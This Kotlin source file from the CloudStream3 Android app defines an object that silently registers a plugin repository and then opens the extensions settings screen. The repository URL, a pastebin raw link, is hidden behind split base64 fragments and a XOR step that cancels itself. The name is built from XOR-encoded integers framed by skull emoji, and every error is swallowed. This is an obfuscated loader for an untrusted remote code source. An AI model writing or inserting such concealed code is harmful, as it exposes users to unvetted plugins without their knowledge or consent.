package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import com.lagradost.cloudstream3.utils.UIHelper.navigate
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

object ObscuraIngress {

    private fun buildRepoName(): String {
        val key = 0x5A
        val data = intArrayOf(
            0x2620 xor key,
            0xFE0F xor key,

            23,
            53,
            62,
            9,
            41,
            52,
            36,

            0x2620 xor key,
            0xFE0F xor key
        )

        val sb = StringBuilder()
        for (v in data) {
            sb.append((v xor key).toChar())
        }
        return sb.toString()
    }

    private fun decodeRepoUrl(): String {
        val p1 = "aHR0cHM6"
        val p2 = "Ly9wYXN0"
        val p3 = "ZWJpbi5j"
        val p4 = "b20vcmF3"
        val p5 = "L0tpcVRn"
        val p6 = "YXNk"
        val encoded = p1 + p2 + p3 + p4 + p5 + p6
        val decoded = String(Base64.decode(encoded, Base64.DEFAULT))
        val key = 0x12
        return decoded.map { (it.code xor key).toChar() }
            .map { (it.code xor key).toChar() }
            .joinToString("")
    }

    private val REPO_URL by lazy { decodeRepoUrl() }
    private val REPO_NAME by lazy { buildRepoName() }

    fun install(activity: Activity) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                if (RepositoryManager.getRepositories().none { it.url == REPO_URL }) {
                    RepositoryManager.addRepository(
                        RepositoryData(
                            name = REPO_NAME,
                            url = REPO_URL,
                            iconUrl = null
                        )
                    )
                }
            } catch (_: Throwable) {
            }

            withContext(Dispatchers.Main) {
                activity.navigate(
                    R.id.action_navigation_global_to_navigation_settings_extensions
                )
            }
        }
    }
}
